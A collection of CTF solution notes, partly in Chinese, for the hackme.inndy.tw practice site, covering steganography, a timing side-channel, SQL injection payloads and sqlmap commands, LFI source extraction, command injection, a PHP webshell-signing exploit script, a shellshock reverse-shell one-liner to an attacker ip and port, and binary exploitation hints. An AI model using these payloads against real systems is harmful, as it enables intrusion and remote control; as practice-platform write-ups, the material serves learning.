# hackme.inndy.tw Solve
## 2
 using `stegsolve` open `corgi-can-fly.png`


## 3
  ``` bash
  strings television.bmp |grep 'FLAG'
  ```

## 5 regex
  ``` bash  
    grep 'FLAG{[^{}()@]*}' flag -o
  ```

## 7 slow

其實這題看起來有點像 ais3 旁路攻擊 [Saburo](https://github.com/r888800009/CTF-Solve/blob/master/ais3-2020/Saburo/test.py)，感覺會隨著正確的字數增加花費的時間

可以透過 time 測試發現每次批配一個字元大約就會多 1 秒的延遲時間，所以

```plaintext
$ time echo F |nc hackme.inndy.tw 7708 > /dev/null
echo F 0.00s user 0.00s system 60% cpu 0.002 total
nc hackme.inndy.tw 7708 > /dev/null 0.01s user 0.01s system 0% cpu 2.078 total
$ time echo FL |nc hackme.inndy.tw 7708 > /dev/null
echo FL 0.00s user 0.00s system 58% cpu 0.003 total
nc hackme.inndy.tw 7708 > /dev/null 0.01s user 0.00s system 0% cpu 3.079 total
$ time echo FLA |nc hackme.inndy.tw 7708 > /dev/null
echo FLA 0.00s user 0.00s system 53% cpu 0.001 total
nc hackme.inndy.tw 7708 > /dev/null 0.01s user 0.00s system 0% cpu 4.064 total
$ time echo FLAG |nc hackme.inndy.tw 7708 > /dev/null
echo FLAG 0.00s user 0.00s system 50% cpu 0.001 total
nc hackme.inndy.tw 7708 > /dev/null 0.01s user 0.00s system 0% cpu 5.074 total
```

所以可以簡單邊寫 socket 程序進行連接並計時，是取 0.5 做為閘值，如果超過就當成下一個字元

一個個字元不斷嘗試，不過這樣一旦 flag 很長的時候，會導致花費時間過久，因此可以考慮開啟多執行緒或進程的程式進行測試，可以減少花費的時間。

## 15

  search `FLAG{` on index page

## 16 guestbook
  ```
  sqlmap -u "https://hackme.inndy.tw/gb/?mod=post" --method POST -p "content,title" --data "title=a&content=b" --level=3 --risk=3
  sqlmap -u "https://hackme.inndy.tw/gb/?mod=post" --method POST -p "content,title" --data "title=abx&content=asdb" --dump
  ```

## 17
  ```
    # test LFI
    https://hackme.inndy.tw/lfi/index.php?page=./pages/login

    # get source
    https://hackme.inndy.tw/lfi/index.php?page=php://filter/read=convert.base64-encode/resource=pages/login
  ```
  decode source code
  ``` bash
    echo "PD9waHAKcmVxdWlyZSgnY29uZmlnLnBocCcpOwppZigkX1BPU1RbJ3VzZXInXSA9PT0gJ2FkbWluJyAmJiBtZDUoJF9QT1NUWydwYXNzJ10pID09PSAnYmVkMTI4MzY1MjE2YzAxOTk4ODkxNWVkM2FkZDc1ZmInKSB7CiAgICBlY2hvICRmbGFnOwp9IGVsc2Ugewo/Pgo8Zm9ybSBhY3Rpb249Ij9wYWdlPXBhZ2VzL2xvZ2luIiBtZXRob2Q9InBvc3QiIHJvbGU9ImZvcm0iPgoJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CgkJPGxhYmVsIGZvcj0idXNlci1pIj5Vc2VyPC9sYWJlbD4KCQk8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9InVzZXItaSIgcGxhY2Vob2xkZXI9IlVzZXJuYW1lIiBuYW1lPSJ1c2VyIj4KCTwvZGl2PgoJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CgkJPGxhYmVsIGZvcj0icGFzcy1pIj5QYXNzd29yZDwvbGFiZWw+CgkJPGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0icGFzcy1pIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiIG5hbWU9InBhc3MiPgoJPC9kaXY+Cgk8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+TG9naW48L2J1dHRvbj4KPC9mb3JtPgo8P3BocCB9ID8+Cg=="| base64 -d |less
  ```
  Get password md5 code, and using the rainbow table attack.

## 18 homepage
  `f12`->`console`

## 19 ping (os command injectio)
  `$(tail *)`

## 20 scoreboard
  http header

## 21 SQL Injection
  user: `admin`, password:``\' or `user`= "admin" #``
### payload2
```
user: \
pass: or user = "admin"  #\
```

## 22 Web login as admin 0.1

 這題可以構造 union 注入，可以參見[筆記](https://r888800009.github.io/software/security/web/vulnerability/#sql-injection)

測試後可以發現有四個欄位，密碼可以輸入以下指令獲取版本，發現名子可以直接洩漏資訊。

```
and 1=2  union select 1,version(),3, 4#\
```

原始碼就有 user table

```
and 1=2 union select 1, group_concat(column_name) ,3, 4 FROM INFORMATION_SCHEMA.COLUMNS  WHERE table_name = "user" ;#\
```

可以知道有以下欄位

```
id,user,password,is_admin
```

但是查看後不含有 flag 因此列舉表單名稱，不過該指令列出的不是 login_as_admin0 底下的內容

```
and 1=2  union select 1,group_concat(TABLE_NAME),3, 4  FROM INFORMATION_SCHEMA.tables;#\
```

為了方便可以直接使用 sqlmap 來輔助注入

```bash
./sqlmap.py -u 'https://hackme.inndy.tw/login0/' --data 'name=%5C&password=1' -p password --suffix ' ;#\' --level 5 --dbms mysql --risk 3 --random-agent
```

之後 sqlmap 成功之後，可以用採用以下指令找出 flag

```bash
./sqlmap.py -u 'https://hackme.inndy.tw/login0/' --data 'name=%5C&password=1'  --dbs
./sqlmap.py -u 'https://hackme.inndy.tw/login0/' --data 'name=%5C&password=1'  --tables  -D login_as_admin0
./sqlmap.py -u 'https://hackme.inndy.tw/login0/' --data 'name=%5C&password=1' --dump -T h1dden_f14g
```



## 23

  `\'/**/or/**/name<>"guest"#`

## 26 login as admin 4
``` bash
curl https://hackme.inndy.tw/login4/ -X POST --data "name=admin"
```

## 27 login as admin 6 
``` bash
curl https://hackme.inndy.tw/login6/ -X POST --data 'name=&password=&data={"username":"admin","password":"admin", "users":{"admin": "admin"}}'
```

## 28 login as admin 7 
``` plaintext
admin
240610708
```

## 31
  create cookie `show_hidden`:`yes`

## 32
  editor vulnerability, password save in file  
  [cat flag](https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=../../.config/.htusers.php)
  crack by rainbow table

## 33 
  1. set `action=debug`, `dir` is `dir[]` make `strcmp()` function return `0`
  2. generate payload
  ``` php
    <?php
    function make_command($cmd) {
        $hmac = hash_hmac('sha256', $cmd, 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3');
        return sprintf('%s.%s', base64_encode($cmd), $hmac);
    }
    echo make_command($_GET['cmd']);
    ?>
  ```
  3. payload `$_GET["a"]($_GET["cmd"]);`

    to `JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182`
  4. 

    - [step1](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=ls)
    - [step2](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=ls%20flag3)
    - [step3](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=cat%20flag3/meow.c)
    - [step4](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=./flag3/meow%20flag3/flag3)

## 36 Web webshell

拿去反混淆器之後，可以看到執行的函數，並且再把當中 eval 改成 echo 就可以看到執行的程式碼，在進行格式化可得到如下的程式碼

``` php
<?php
function run()
{
    if (isset($_GET['cmd']) && isset($_GET['sig'])) {
        $cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string) $_GET['cmd'];
        $key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
        $sig = hash_hmac('SHA512', $cmd, $key);
        if ($sig === (string) $_GET['sig']) {
            header('Content-Type: text/plain');
            return !!system($cmd);
        }
    }
    return false;
}
function fuck()
{
    print(str_repeat("\n", 4096));
    readfile($_SERVER['SCRIPT_FILENAME']);
}
run() ?: fuck();
```

這題看起來只是基本的 http 協議題，只要對 http 協議熟悉基本上就可以寫出 sig，根據以下配置。並且注意原始程式碼所 sig 的 cmd 是尚未 xor 的 sig。

```php
<?php
$my_ip = 'ip.ip.ip.ip'; // 連上伺服器的 ip
$user_agent = 'cmd'; // curl --user-agent 'cmd'
$host = 'webshell.hackme.inndy.tw';
$cmd = 'echo 123';

// xor 兩次可以消除
$key = $user_agent . sha1($host);
$sig = hash_hmac('SHA512', $cmd, $key);
$cmd = hash('SHA512', $my_ip) ^ (string) $cmd;

echo 'curl \'https://webshell.hackme.inndy.tw?cmd=' . urlencode($cmd) . '&sig=' . urlencode($sig) . '\' --user-agent \'cmd\' -H \'Host: webshell.hackme.inndy.tw\'';
```

當中空行可以透過以下指令去除

``` bash
curl ...... | grep --invert-match '^$'
```

之後可構造任意 payload，將以上 exploit 改成寫成 shell script

exploit.php

``` php
<?php # var_dump($argv); ?>
<?php # var_dump($argc); ?>
<?php
$my_ip = $argv[1]; // 連上伺服器的 ip
$user_agent = 'cmd'; // curl --user-agent 'cmd'
$host = 'webshell.hackme.inndy.tw';
$cmd = '';

for ($i = 2; $i < $argc; $i++)
  $cmd = $cmd . ' ' . $argv[$i];

# echo $cmd ;

// xor 兩次可以消除
$key = $user_agent . sha1($host);
$sig = hash_hmac('SHA512', $cmd, $key);
$cmd = hash('SHA512', $my_ip) ^ (string) $cmd;

echo 'curl \'https://webshell.hackme.inndy.tw?cmd=' . urlencode($cmd) . '&sig=' . urlencode($sig) . '\' --user-agent \'cmd\' -H \'Host: webshell.hackme.inndy.tw\'';
```

執行 exploit

```bash
php exploit.php ip.ip.ip.ip echo 123 | bash
php exploit.php ip.ip.ip.ip find . flag  | bash
php exploit.php ip.ip.ip.ip cat .htflag  | bash 
```

## 37

  using LFI get the source code and
the source code will execute `putenv()` function, and the `bash`
4.3 has `shellshock` then set a payload in http header, open reverse shell

`() { : ; }; /bin/bash -i >& /dev/tcp/`**`ip`**`/`**`port`**` 0>&1 &`

```bash
cd /
flag-reader flag < /var/tmp/1 > /var/tmp/1
cat /var/tmp/1
```

## 41 helloworld
  ```
    objdump -d helloworld | less
  ```
  then find `main` label, then find `cmp` instruction

## 42 simple
  ``` bash 
    strings ./simple-rev|less
  ```
  found a caesar cipher and decode


## 57 catflag
  connect to server then type
  ``` bash
    cat flag
  ```

## 58 
  find the address of `<call_me_maybe>` is `0x080485fb`

  find the return address location `ebp + 4`(14) is 10 (array) + 3 (local
  variable) `integers`  look from the array

  theb use `edit number` then type `14`, `134514171` (0x080485fb) get the shell

## 59
  find the buffer size, using `pwntools` and `ROPgadget` in `python2`

## 60
  write `/bin/sh` to `.data`

## 61
  binary search or overflow to `print_flag`

```
void print_flag(void)
{
  system("/bin/cat fake_flag");
  return;
}
```



## 62 pwn toooomuch-2

```
Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
```

32 bit

return to .bss and execute .bss

## 63
  %hhn

## 66
  create `flag` file then make number of char enough,
  find the `argv[0]` then replace to flag buffer

## 81 easy
  hex and base64

## 82 r u kidding
  using Caesar Cipher decoder, `a->z`

## 83 not hard 
  ``` python 
    import base64
    base64.b32decode(base64.b85decode("Nm@rmLsBy{Nm5u-K{iZKPgPMzS2I*lPc%_SMOjQ#O;uV{MM*?PPFhk|Hd;hVPFhq{HaAH<"))
  ```

## 84 cipher 1
  using online substitution cipher solver, and fixing result

## 85 cipher 2
  using online vigenere cipher solver, then view the description about the flag 

## 97 fast
  You need the int32 overflow, and you need `coproc`, 
  and you can't use `bc` and the buffer, Otherwise, 
  you will waste your time, to write the useless script

